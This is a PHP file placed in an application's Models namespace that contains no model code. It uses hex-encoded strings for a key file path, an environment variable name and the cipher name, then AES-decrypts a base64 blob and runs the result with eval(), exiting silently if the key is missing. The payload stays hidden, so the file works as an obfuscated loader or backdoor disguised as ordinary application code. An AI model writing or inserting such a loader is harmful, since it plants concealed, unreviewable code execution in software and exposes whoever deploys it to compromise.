<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bkxhDU+/l70W+dZ//ED3Yw==');

$c=base64_decode(

'6CQnatyaziVM3+VqF/K8oEegXHiq0tgAt0+Bt8caUQ62dbVuNi4eZaA/0Z5sIzaG31irx+CHLKe8' .
'8UbzyDzxo+evbHJq/yAc8xNAqCkT72UIu/B/b0AoRc5PdMgzdx/uV3eU+09wtTXaLC4wcxg8dzub' .
'SVmAeEcCTYd5nhCXJMKju3BCRsANKORJRuE0cl6UP6dnodK1vO19wOPjDO8bqxrtkOpXnqTU+kuu' .
'PaT8MqfLV5VFVTgC6U9xIsQaaaCG/fhNv1G7eAJNXY5jGR3TGGEUeWByVZYm5sSAjugcCEzs0lkR' .
'JwubqsfJDKGRtuvvU1zqlD2slorkIGHV8FBiRxUbiVwQAEEDnG7h0wq9DvI4sTUnh3tuqFVOxtxU' .
'BD9Nzs3jbnb+RSs+boOFUIpf6GZ8t/MUhp72riKarbpY6mYqtRH4IDvCnFzYp29l/L3xhKr35e0z' .
'2Q2X9qFquPx00pRNEe7d8q+ELbTHms8KdpE/8aSp42sLHYTTOEYfvIqCJFDm66F7TyNXFYFE+TFa' .
'CUzsOYf1to9mWBEX1h/MX1vm4V0Flw/lE0BCHW40ne4Mch7IAaGCfGTgxcIh5SfcEbJCZPb6XX9p' .
'+u2mahhrSohs6S5pWWVsjb9RASuAGURtEjA78aJXxIftdBuoJd3FHp+LUnVsQ+CTV991BJhev2wl' .
'gAx68KujAKDrqzccBmhof+43Nly3W1tB8QwQpnTSado24chl2veLaWxy4R9LA3g1kiFyyVDF+++6' .
'VIgET/HlPwIjyj7JcllwftVMpp9zkA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

